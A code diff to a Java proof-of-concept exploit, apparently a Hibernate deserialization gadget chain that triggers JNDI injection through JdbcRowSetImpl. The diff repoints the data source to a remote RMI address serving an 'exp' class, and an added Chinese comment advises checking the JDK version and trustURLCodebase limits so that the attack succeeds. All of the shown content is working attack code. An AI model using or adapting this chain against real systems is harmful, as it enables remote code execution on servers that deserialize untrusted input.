@@ -1,5 +1,4 @@
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+
 import com.sun.rowset.JdbcRowSetImpl;
 import org.hibernate.engine.spi.TypedValue;
 import org.hibernate.property.access.spi.GetterMethodImpl;
@@ -27,6 +26,9 @@ import java.util.HashMap;
  *                           GetterMethodImpl.get / BasicPropertyAccessor$BasicGetter.get
  *                               JdbcRowSetImpl.getDatabaseMetaData
  * */
+/*
+注意jdk版本以及JdbcRowSetImpl是否存在trustURLCodebase限制
+* */
 /*依赖:
     Hibernate5.4.32.Final
 * */
@@ -34,8 +36,7 @@ public class Hibernate2 {
     public static void main(String[] args) throws Exception {
 
         JdbcRowSetImpl rs = new JdbcRowSetImpl();
-        rs.setDataSourceName("ldap://127.0.0.1:1389/EXP");
-        rs.setAutoCommit(true);
+        rs.setDataSourceName("rmi://10.0.0.210:8085/exp");
 
         Method method = JdbcRowSetImpl.class.getDeclaredMethod("getDatabaseMetaData");
         Class<?> getterImpl = Class.forName("org.hibernate.property.access.spi.GetterMethodImpl");
